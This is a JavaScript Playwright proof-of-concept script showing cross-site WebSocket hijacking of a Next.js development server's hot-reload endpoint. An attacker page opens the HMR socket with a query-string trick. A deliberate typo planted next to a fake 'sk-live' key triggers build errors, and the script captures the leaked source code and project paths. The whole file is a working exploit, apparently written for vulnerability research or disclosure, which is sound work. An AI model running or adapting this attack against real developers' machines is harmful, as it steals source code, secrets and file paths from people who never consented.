const { chromium } = require('playwright-core');
const fs = require('fs');
const PAGE = '/home/user/nextlab/app/page.js';
const ORIG = fs.readFileSync(PAGE, 'utf8');

(async () => {
  const b = await chromium.launch({
    executablePath: '/opt/pw-browsers/chromium-1194/chrome-linux/chrome',
    headless: true, args: ['--no-sandbox', '--no-proxy-server'],
  });

  // ---- the attacker's page: nothing but a WebSocket ----
  const attacker = await b.newPage();
  await attacker.goto('http://attacker.test:8899/blank.html');
  await attacker.evaluate(() => {
    window.captured = [];
    window.state = 'connecting';
    const ws = new WebSocket('ws://victimdev.test:3020/_next/hmr?x=/_next/image');
    ws.onopen = () => { window.state = 'OPEN'; };
    ws.onerror = () => { window.state = 'ERROR'; };
    ws.onmessage = (e) => window.captured.push(String(e.data));
  });
  await attacker.waitForTimeout(1500);
  console.log('attacker socket state:', await attacker.evaluate(() => window.state));

  // ---- meanwhile, the developer works on their own project ----
  const dev = await b.newPage();
  await dev.goto('http://localhost:3020/');
  await dev.waitForTimeout(1500);

  // A typo, of the kind every developer makes many times an hour.
  fs.writeFileSync(PAGE,
    'const API_KEY = "sk-live-51H9xQ2rTvB8mNpK4wZ"\n' +
    'export default function Home() { return <main>nextlab home</main >\n');
  await dev.waitForTimeout(4000);
  fs.writeFileSync(PAGE, ORIG);
  await dev.waitForTimeout(2000);

  const msgs = await attacker.evaluate(() => window.captured);
  fs.writeFileSync(__dirname + '/ws_captured_messages.json', JSON.stringify(msgs, null, 2));

  console.log(`\n${msgs.length} messages read cross-site by attacker.test.\n`);
  const interesting = msgs.filter((m) => /error|Error|page\.js|API_KEY|sk-live/.test(m));
  console.log(`${interesting.length} of them carry build-error / source detail. Excerpts:\n`);
  for (const m of interesting.slice(0, 4)) {
    console.log('  ' + m.replace(/\\n/g, '\n  ').slice(0, 900));
    console.log('  ' + '-'.repeat(70));
  }
  const leaksPath = msgs.some((m) => m.includes('/home/user/nextlab'));
  const leaksSource = msgs.some((m) => m.includes('API_KEY') || m.includes('sk-live'));
  console.log('\n  absolute project path present in stream :', leaksPath);
  console.log('  developer source code present in stream :', leaksSource);
  await b.close();
})();
